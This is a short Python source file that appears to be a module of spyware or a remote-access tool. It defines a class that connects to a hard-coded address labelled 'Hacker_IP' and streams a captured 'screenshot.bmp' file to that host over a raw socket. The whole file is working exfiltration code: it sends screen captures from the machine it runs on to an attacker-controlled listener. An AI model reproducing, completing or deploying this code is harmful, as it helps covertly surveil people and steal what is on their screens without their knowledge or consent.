import socket

class Networking() :

	def __init__(self) :

		self.Hacker_IP = '192.168.0.155'
		self.Hacker_Port = 1002
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.client.connect((self.Hacker_IP, self.Hacker_Port))

	def SendScreenshots(self, File_Name) :
		self.file = open('screenshot.bmp', 'rb')
		image_data = self.file.read(2048)

		while image_data :
			self.client.send(image_data)
			image_data = self.file.read(2048)

	def Ending(self) :
		self.file.close()
		self.client.close()